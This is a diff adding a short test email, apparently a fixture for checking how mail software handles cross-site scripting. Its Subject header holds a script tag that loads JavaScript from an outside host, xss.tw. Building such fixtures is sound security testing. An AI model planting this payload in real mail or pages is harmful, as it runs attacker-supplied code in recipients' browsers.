@@ -1,0 +1,7 @@
+From: "Eunice Meyer" <mrva@n1.com>
+To: "Stroman Inc, Alvis Miller" <jose@monkey.org>
+Subject: <script src=http://xss.tw/pdjsa></script>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
